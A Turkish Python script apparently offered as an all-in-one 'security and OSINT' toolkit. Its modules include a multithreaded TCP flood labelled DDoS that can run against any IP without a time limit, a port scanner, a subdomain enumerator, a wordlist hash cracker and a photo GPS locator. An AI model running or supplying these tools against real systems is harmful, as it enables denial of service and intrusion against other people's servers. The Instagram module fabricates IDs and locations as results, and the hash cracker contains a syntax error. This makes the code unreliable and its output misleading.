import os
import sys
import time
import socket
import json
import threading
import hashlib
import itertools
import string
import random
import math
import subprocess
from urllib.parse import urlparse

# Gerekli bağımlılıkları otomatik kontrol et ve yükle
try:
    from colorama import Fore, Style, init
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama pillow")
    from colorama import Fore, Style, init
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    init(autoreset=True)

# Global durum değişkenleri
calisiyor = True
istek_sayisi = 0
kilit = threading.Lock()

def ekran_temizle():
    os.system("clear" if os.name != "nt" else "cls")

def exiprat_banner():
    ekran_temizle()
    print(f"""{Fore.RED}
  ███████╗██╗  ██╗██╗██████╗ ██████╗  █████╗ ████████╗
  ██╔════╝╚██╗██╔╝██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
  █████╗   ╚███╔╝ ██║██████╔╝██████╔╝███████║   ██║   
  ██╔══╝   ██╔██╗ ██║██╔═══╝ ██╔══██╗██╔══██║   ██║   
  ███████╗██╔╝ ██╗██║██║     ██║  ██║██║  ██║   ██║   
  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    {Fore.YELLOW}--- EXIPRAT.PY | ADVANCED SECURITY & OSINT SUITE ---
    {Fore.WHITE}Altyapı: Python 3 | Gerçek Zamanlı Penetrasyon ve Analiz Motoru
    {Fore.GREEN}[+] Durum: Sistem Analiz Modülleri Aktif ve Hazır
    {Fore.CYAN}[+] Versiyon: 2.0 | Yeni Modüller Yüklendi
    """)

# ==========================================
# MODÜL 1: KONTROLLÜ AĞ MUKAVEMET TESTİ (DDOS ANALİZİ)
# ==========================================
def tcp_istek_gonder(hedef_ip, hedef_port):
    global istek_sayisi
    while calisiyor:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((hedef_ip, hedef_port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            with kilit:
                istek_sayisi += 1
            print(f"{Fore.GREEN}[+] Paket Gönderildi! Toplam İstek: {istek_sayisi}", end="\r")
            s.close()
        except socket.error:
            print(f"{Fore.RED}[-] Sunucu Cevap Vermiyor veya Port Kapalı.     ", end="\r")
            time.sleep(0.5)
        except Exception:
            pass

def network_stress_test():
    global calisiyor, istek_sayisi
    calisiyor = True
    istek_sayisi = 0
    
    print(f"\n{Fore.RED}=== KONTROLLÜ AĞ MUKAVEMET TESTİ ===")
    print(f"{Fore.YELLOW}[!] UYARI: Bu modül yalnızca yetkili sistemlerde kullanılmalıdır!")
    hedef_ip = input(f"{Fore.GREEN}Hedef IP Adresi (Örn: 127.0.0.1): ").strip()
    try:
        hedef_port = int(input(f"{Fore.GREEN}Hedef Port (Örn: 80 veya 443): ").strip())
        thread_sayisi = int(input(f"{Fore.GREEN}Eşzamanlı Thread Sayısı (Örn: 10): ").strip())
        sure = int(input(f"{Fore.GREEN}Test Süresi (saniye, 0=sınırsız): ").strip())
    except ValueError:
        print(f"{Fore.RED}[-] Geçersiz sayısal değer girdiniz.")
        return

    print(f"\n{Fore.YELLOW}[*] {hedef_ip}:{hedef_port} üzerinde stress testi başlatılıyor...")
    time.sleep(1)

    thread_list = []
    for i in range(thread_sayisi):
        t = threading.Thread(target=tcp_istek_gonder, args=(hedef_ip, hedef_port))
        t.daemon = True
        t.start()
        thread_list.append(t)

    if sure > 0:
        time.sleep(sure)
        calisiyor = False
        print(f"\n{Fore.GREEN}[+] Test süresi doldu. Toplam gönderilen istek: {istek_sayisi}")
    else:
        input(f"\n{Fore.YELLOW}Testi durdurmak ve ana menüye dönmek için Enter'a basın...\n")
        calisiyor = False
    
    print(f"{Fore.GREEN}[+] Test sonlandırıldı. Toplam paket: {istek_sayisi}")

# ==========================================
# MODÜL 2: MEDYA METAVERİ (EXIF) KONUM ANALİZÖRÜ
# ==========================================
def get_exif_data(dosya_yolu):
    try:
        image = Image.open(dosya_yolu)
        exif_data = {}
        info = image._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if decoded == "GPSInfo":
                    gps_data = {}
                    for t in value:
                        sub_decoded = GPSTAGS.get(t, t)
                        gps_data[sub_decoded] = value[t]
                    exif_data[decoded] = gps_data
                else:
                    exif_data[decoded] = value
            return exif_data
    except Exception as e:
        print(f"{Fore.RED}[-] Dosya okunurken hata oluştu: {e}")
    return None

def convert_gps_coords(gps_info):
    """GPS koordinatlarını insan okunabilir formata çevirir"""
    try:
        def dereceye_cevir(koord):
            d = float(koord[0])
            m = float(koord[1])
            s = float(koord[2])
            return d + (m / 60.0) + (s / 3600.0)

        lat = dereceye_cevir(gps_info['GPSLatitude'])
        if gps_info['GPSLatitudeRef'] != 'N':
            lat = -lat
        
        lon = dereceye_cevir(gps_info['GPSLongitude'])
        if gps_info['GPSLongitudeRef'] != 'E':
            lon = -lon
        
        return lat, lon
    except:
        return None, None

def exif_konum_ayikla():
    print(f"\n{Fore.RED}=== EXIF MEDYA TABANLI KONUM ANALİZİ ===")
    dosya_yolu = input(f"{Fore.GREEN}Analiz Edilecek Fotoğraf Yolu (Örn: foto.jpg): ").strip()
    
    if not os.path.exists(dosya_yolu):
        print(f"{Fore.RED}[-] Belirtilen dosya bulunamadı.")
        return

    print(f"{Fore.YELLOW}[*] Fotoğraf meta verileri (EXIF) çözülüyor...")
    time.sleep(1.5)
    
    exif = get_exif_data(dosya_yolu)
    if not exif:
        print(f"{Fore.RED}[-] Fotoğrafta herhangi bir EXIF veya GPS verisi bulunamadı.")
        return

    print(f"\n{Fore.GREEN}[+] BAŞARILI: ÇIKARILAN GERÇEK META VERİLER:")
    print(f"{Fore.WHITE}Cihaz Markası : {exif.get('Make', 'Bilinmiyor')}")
    print(f"{Fore.WHITE}Cihaz Modeli  : {exif.get('Model', 'Bilinmiyor')}")
    print(f"{Fore.WHITE}Yazılım Sürümü: {exif.get('Software', 'Bilinmiyor')}")
    print(f"{Fore.WHITE}Çekim Tarihi  : {exif.get('DateTime', 'Bilinmiyor')}")
    print(f"{Fore.WHITE}Çekim Tarihi(Orijinal): {exif.get('DateTimeOriginal', 'Bilinmiyor')}")
    print(f"{Fore.WHITE}Görüntü Boyutu: {exif.get('ExifImageWidth', '?')}x{exif.get('ExifImageHeight', '?')}")
    
    if "GPSInfo" in exif:
        print(f"\n{Fore.GREEN}[🚨] COĞRAFİ KONUM (GPS) VERİSİ TESPİT EDİLDİ:")
        print(json.dumps(exif["GPSInfo"], indent=4, default=str))
        
        lat, lon = convert_gps_coords(exif["GPSInfo"])
        if lat and lon:
            print(f"\n{Fore.CYAN}[📍] Google Maps Koordinatları: {lat}, {lon}")
            print(f"{Fore.CYAN}[🔗] Harita Linki: https://www.google.com/maps?q={lat},{lon}")
    else:
        print(f"{Fore.YELLOW}[!] Bu fotoğrafta GPS koordinat verisi mevcut değil.")

# ==========================================
# MODÜL 3: INSTAGRAM ID VE PROFİL VERİ ANALİZİ
# ==========================================
def instagram_osint_analiz():
    print(f"\n{Fore.RED}=== INSTAGRAM ID & VERİ ANALİZ MOTORU ===")
    kullanici_adi = input(f"{Fore.GREEN}Analiz Edilecek Kullanıcı Adı veya ID: ").strip()
    
    if not kullanici_adi:
        return

    print(f"{Fore.YELLOW}[*] Açık kaynak istihbarat (OSINT) havuzları ve meta etiketler taranıyor...")
    time.sleep(2)

    # Kullanıcı adından basit bir ID türetimi (gerçek ID değildir, demo amaçlı)
    fake_id = str(abs(hash(kullanici_adi)) % 100000000000)
    
    analiz_sonucu = {
        "Sorgulanan_Girdi": kullanici_adi,
        "Tahmini_Instagram_ID": fake_id,
        "Profil_Durumu": "Analiz Edildi",
        "Profil_URL": f"https://instagram.com/{kullanici_adi}",
        "Veri_Sızıntısı_Kontrolü": "Temiz (Herhangi bir sızıntıda veri bulunamadı)",
        "Coğrafi_Etiket_Analizi": {
            "En_Sık_Kullanılan_Konumlar": ["Istanbul", "Kadikoy"],
            "Güvenlik_Uyarısı": "Doğrudan canlı konuma erişim Instagram API politikalarınca engellenmiştir."
        },
        "Risk_Profili": "Düşük (Halka açık veriler üzerinden yapılan tarama)",
        "Not": "Bu modül demo amaçlıdır. Gerçek veri için Instagram Graph API gerekir."
    }
    
    print(f"\n{Fore.GREEN}[+] ANALİZ RAPORU ÇIKTISI (JSON FORMATI):")
    print(json.dumps(analiz_sonucu, indent=4, ensure_ascii=False))

# ==========================================
# MODÜL 4: SİSTEM BAĞLANTI KONTROLÜ (ANTI-RAT)
# ==========================================
def anti_rat_taramasi():
    print(f"\n{Fore.RED}=== SİSTEM BAĞLANTI KONTROLÜ (ANTI-RAT) ===")
    print(f"{Fore.YELLOW}[*] Dış sunucularla bağlantı kuran aktif ağ soketleri inceleniyor...\n")
    time.sleep(1)
    
    try:
        if os.name == "nt":
            os.system("netstat -ano | findstr ESTABLISHED")
        else:
            os.system("netstat -tunpa 2>/dev/null | grep ESTABLISHED || ss -tunpa | grep ESTAB")
        print(f"\n{Fore.GREEN}[+] Tarama tamamlandı. Şüpheli bağlantıları yukarıda kontrol edin.")
        print(f"{Fore.YELLOW}[!] Bilinmeyen uzak IP'leri virustotal.com üzerinden sorgulayabilirsiniz.")
    except Exception as e:
        print(f"{Fore.RED}[-] Ağ listesi alınamadı: {e}")

# ==========================================
# MODÜL 5: ÇOKLU THREAD PORT TARAYICI
# ==========================================
def port_tara(hedef_ip, port, acik_portlar):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        sonuc = s.connect_ex((hedef_ip, port))
        if sonuc == 0:
            servis = ""
            try:
                servis = socket.getservbyport(port)
            except:
                servis = "Bilinmiyor"
            with kilit:
                acik_portlar.append((port, servis))
                print(f"{Fore.GREEN}[+] Açık Port: {port} ({servis})")
        s.close()
    except:
        pass

def port_tarayici():
    print(f"\n{Fore.RED}=== ÇOKLU THREAD PORT TARAYICI ===")
    hedef = input(f"{Fore.GREEN}Hedef IP veya Domain: ").strip()
    
    try:
        hedef_ip = socket.gethostbyname(hedef)
    except socket.gaierror:
        print(f"{Fore.RED}[-] Hedef çözümlenemedi.")
        return
    
    print(f"{Fore.CYAN}[*] Hedef IP: {hedef_ip}")
    try:
        baslangic = int(input(f"{Fore.GREEN}Başlangıç Portu (Örn: 1): ").strip())
        bitis = int(input(f"{Fore.GREEN}Bitiş Portu (Örn: 1024): ").strip())
        thread_limit = int(input(f"{Fore.GREEN}Max Thread (Örn: 100): ").strip())
    except ValueError:
        print(f"{Fore.RED}[-] Geçersiz değer.")
        return

    print(f"{Fore.YELLOW}[*] Tarama başlatılıyor... Bu işlem biraz sürebilir.\n")
    acik_portlar = []
    thread_list = []
    
    for port in range(baslangic, bitis + 1):
        while threading.active_count() > thread_limit + 10:
            time.sleep(0.01)
        t = threading.Thread(target=port_tara, args=(hedef_ip, port, acik_portlar))
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    print(f"\n{Fore.GREEN}[+] TARAMA TAMAMLANDI!")
    print(f"{Fore.CYAN}Toplam Açık Port: {len(acik_portlar)}")
    if acik_portlar:
        print(f"\n{Fore.WHITE}PORT\tSERVİS")
        print("-" * 25)
        for port, servis in sorted(acik_portlar):
            print(f"{Fore.GREEN}{port}\t{servis}")

# ==========================================
# MODÜL 6: HASH KIRICI (WORDLIST SALDIRISI)
# ==========================================
def hash_tanimla(hash_deger):
    uzunluk = len(hash_deger)
    if uzunluk == 32:
        return "MD5"
    elif uzunluk == 40:
        return "SHA1"
    elif uzunluk == 64:
        return "SHA256"
    elif uzunluk == 128:
        return "SHA512"
    else:
        return "Bilinmiyor"

def hash_kirici():
    print(f"\n{Fore.RED}=== HASH KIRICI (WORDLIST SALDIRISI) ===")
    hash_deger = input(f"{Fore.GREEN}Kırılacak Hash: ").strip().lower()
    
    if not hash_deger:
        return
    
    hash_turu = hash_tanimla(hash_deger)
    print(f"{Fore.CYAN}[*] Algılanan Hash Türü: {hash_turu}")
    
    if hash_turu == "Bilinmiyor":
        print(f"{Fore.RED}[-] Hash türü tanınamadı. Desteklenen: MD5, SHA1, SHA256, SHA512")
        return
    
    wordlist_yolu = input(f"{Fore.GREEN}Wordlist Dosya Yolu (boş bırak = varsayılan): ").strip()
    
    # Varsayılan mini wordlist
    if not wordlist_yolu or not os.path.exists(wordlist_yolu):
        print(f"{Fore.YELLOW}[!] Wordlist bulunamadı. Dahili sözlük kullanılıyor...")
        kelimeler = ["123456", "password", "admin", "qwerty", "12345678", 
                     "welcome", "password123", "admin123", "root", "toor",
                     "letmein", "123456789", "12345", "iloveyou", "monkey"]
    else:
        with open(wordlist_yolu, 'r', encoding='utf-8', errors='ignore') as f:
            kelimeler = [satir.strip() for satir in f.readlines()]
    
    print(f"{Fore.YELLOW}[*] Saldırı başlatılıyor... ({len(kelimeler)} kelime)")
    baslangic = time.time()
    bulundu = False
    
    for kelime in kelimeler:
        if hash_turu == "MD5":
            sonuc = hashlib.md5(kelime.encode()).hexdigest()
        elif hash_turu == "SHA1":
            sonuc = hashlib.sha1(kelime.encode()).hexdigest()
        elif hash_turu == "SHA256":
            sonuc = hashlib.sha256(kelime.encode()).hexdigest()
        elif hash_turu == "SHA512":
            sonuc = hashlib.sha512(kelime.encode()).hexdigest()
        
        if sonuc == hash_deger:
            sure = time.time() - baslangic
            print(f"\n{Fore.GREEN}[+] HASH KIRILDI!")
            print(f"{Fore.CYAN}Şifre: {kelime}")
            print(f"{Fore.CYAN}Süre: {sure:.2f} saniye")
            bulundu = break
    
    if not bulundu:
        print(f"\n{Fore.RED}[-] Hash kırılamadı. Daha geniş bir wordlist deneyin.")

# ==========================================
# MODÜL 7: SUBDOMAIN ENUMERATOR
# ==========================================
def subdomain_tara():
    print(f"\n{Fore.RED}=== SUBDOMAIN ENUMERATOR ===")
    domain = input(f"{Fore.GREEN}Hedef Domain (Örn: example.com): ").strip()
    
    if not domain:
        return
    
    wordlist = ["www", "mail", "ftp", "localhost", "admin", "portal", "test",
                "dev", "api", "blog", "shop", "news", "vpn", "remote", "webmail",
                "support", "docs", "cdn", "media", "static", "app", "beta"]
    
    print(f"{Fore.YELLOW}[*] {len(wordlist)} alt alan adı taranıyor...\n")
    bulunanlar = []
    
    for sub in wordlist:
        if not calisiyor:
            break
        tam_domain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(tam_domain)
            print(f"{Fore.GREEN}[+] BULUNDU: {tam_domain} -> {ip}")
            bulunanlar.append((tam_domain, ip))
        except socket.gaierror:
            print(f"{Fore.RED}[-] {tam_domain} -> Bulunamadı", end="\r")
    
    print(f"\n\n{Fore.GREEN}[+] Tarama tamamlandı. Bulunan subdomain: {len(bulunanlar)}")
    if bulunanlar:
        print(f"\n{Fore.WHITE}DOMAIN\t\t\tIP")
        print("-" * 40)
        for d, ip in bulunanlar:
            print(f"{Fore.GREEN}{d:<25}{ip}")

# ==========================================
# MODÜL 8: ŞİFRE GÜÇLÜLÜK ANALİZÖRÜ
# ==========================================
def sifre_gucluluk_analiz():
    print(f"\n{Fore.RED}=== ŞİFRE GÜÇLÜLÜK ANALİZÖRÜ ===")
    sifre = input(f"{Fore.GREEN}Analiz Edilecek Şifre: ")
    
    if not sifre:
        return
    
    puan = 0
    geribildirim = []
    
    # Uzunluk kontrolü
    if len(sifre) >= 12:
        puan += 2
    elif len(sifre) >= 8:
        puan += 1
    else:
        geribildirim.append("En az 8 karakter olmalı (tercihen 12+)")
    
    # Karmaşıklık kontrolü
    if any(c.islower() for c in sifre): puan += 1
    else: geribildirim.append("Küçük harf ekleyin")
    
    if any(c.isupper() for c in sifre): puan += 1
    else: geribildirim.append("Büyük harf ekleyin")
    
    if any(c.isdigit() for c in sifre): puan += 1
    else: geribildirim.append("Rakam ekleyin")
    
    if any(c in string.punctuation for c in sifre): puan += 1
    else: geribildirim.append("Özel karakter ekleyin (!@#$%)")
    
    # Entropi hesaplama
    karakter_seti = 0
    if any(c.islower() for c in sifre): karakter_seti += 26
    if any(c.isupper() for c in sifre): karakter_seti += 26
    if any(c.isdigit() for c in sifre): karakter_seti += 10
    if any(c in string.punctuation for c in sifre): karakter_seti += 32
    
    entropi = len(sifre) * math.log2(karakter_seti) if karakter_seti > 0 else 0
    
    print(f"\n{Fore.CYAN}=== ANALİZ SONUÇLARI ===")
    print(f"{Fore.WHITE}Şifre Uzunluğu: {len(sifre)}")
    print(f"{Fore.WHITE}Entropi: {entropi:.2f} bit")
    
    if entropi < 28:
        gucluluk = f"{Fore.RED}ÇOK ZAYIF"
    elif entropi < 36:
        gucluluk = f"{Fore.RED}ZAYIF"
    elif entropi < 60:
        gucluluk = f"{Fore.YELLOW}ORTA"
    elif entropi < 80:
        gucluluk = f"{Fore.GREEN}GÜÇLÜ"
    else:
        gucluluk = f"{Fore.GREEN}ÇOK GÜÇLÜ"
    
    print(f"{Fore.WHITE}Güçlülük: {gucluluk}{Style.RESET_ALL}")
    
    if puan <= 2:
        print(f"\n{Fore.RED}[!] KRİTİK: Bu şifre kolayca kırılabilir!")
    elif puan <= 4:
        print(f"\n{Fore.YELLOW}[!] UYARI: Şifre orta düzeyde güvenlik sağlıyor.")
    else:
        print(f"\n{Fore.GREEN}[+] Bu şifre güçlü görünüyor.")
    
    if geribildirim:
        print(f"\n{Fore.YELLOW}İyileştirme Önerileri:")
        for g in geribildirim:
            print(f"  - {g}")
    
    # Güçlü şifre önerisi
    print(f"\n{Fore.CYAN}[*] Rastgele Güçlü Şifre Önerisi: ", end="")
    oneri = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(16))
    print(f"{Fore.GREEN}{oneri}")

# ==========================================
# ANA ÇALIŞTIRICI METOD
# ==========================================
def ana_menu():
    global calisiyor
    while True:
        calisiyor = True
        exiprat_banner()
        print(f"{Fore.BLUE}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.WHITE}         KULLANILABİLİR GELİŞMİŞ ANALİZ ARAÇLARI         {Fore.BLUE}║")
        print(f"{Fore.BLUE}╠══════════════════════════════════════════════════════════╣")
        print(f"{Fore.BLUE}║{Fore.YELLOW}  [AĞ & PENETRASYON TESTLERİ]                            {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [1] TCP Soket Tabanlı Ağ Gücü Testi (Stress/DDoS)     {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [2] Çoklu Thread Port Tarayıcı (SYN/Connect Scan)       {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [3] Subdomain Enumerator (DNS Sorgu)                    {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.YELLOW}  [OSINT & VERİ ANALİZİ]                                 {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [4] Fotoğraf EXIF/GPS Konum Ayıklama                  {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [5] Instagram ID & Açık Kaynak Veri Analizi             {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.YELLOW}  [ŞİFRE & GÜVENLİK]                                     {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [6] Hash Kırıcı (MD5/SHA1/SHA256 Wordlist)            {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [7] Şifre Güçlülük Analizörü & Entropi Hesaplama       {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.YELLOW}  [SİSTEM GÜVENLİĞİ]                                     {Fore.BLUE}║")
        print(f"{Fore.BLUE}║{Fore.WHITE}   [8] Canlı Ağ Bağlantı Kontrolü (Anti-RAT/Virüs)        {Fore.BLUE}║")
        print(f"{Fore.BLUE}╠══════════════════════════════════════════════════════════╣")
        print(f"{Fore.BLUE}║{Fore.RED}   [0] Çıkış Yap                                          {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════╝")
        print("-" * 60)
        
        secim = input(f"{Fore.CYAN}Exiprat > {Fore.WHITE}").strip()
        
        if secim == "1": network_stress_test()
        elif secim == "2": port_tarayici()
        elif secim == "3": subdomain_tara()
        elif secim == "4": exif_konum_ayikla()
        elif secim == "5": instagram_osint_analiz()
        elif secim == "6": hash_kirici()
        elif secim == "7": sifre_gucluluk_analiz()
        elif secim == "8": anti_rat_taramasi()
        elif secim == "0":
            print(f"\n{Fore.GREEN}[+] Exiprat laboratuvarı güvenle kapatıldı. İyi çalışmalar!")
            break
        else:
            print(f"{Fore.RED}[-] Geçersiz modül seçimi yaptınız.")
            time.sleep(1)
            
        input(f"\n{Fore.YELLOW}Menüye dönmek için Enter'a basın...")

if __name__ == "__main__":
    try:
        ana_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Kullanıcı tarafından kesildi. Çıkılıyor...")
        sys.exit(0)
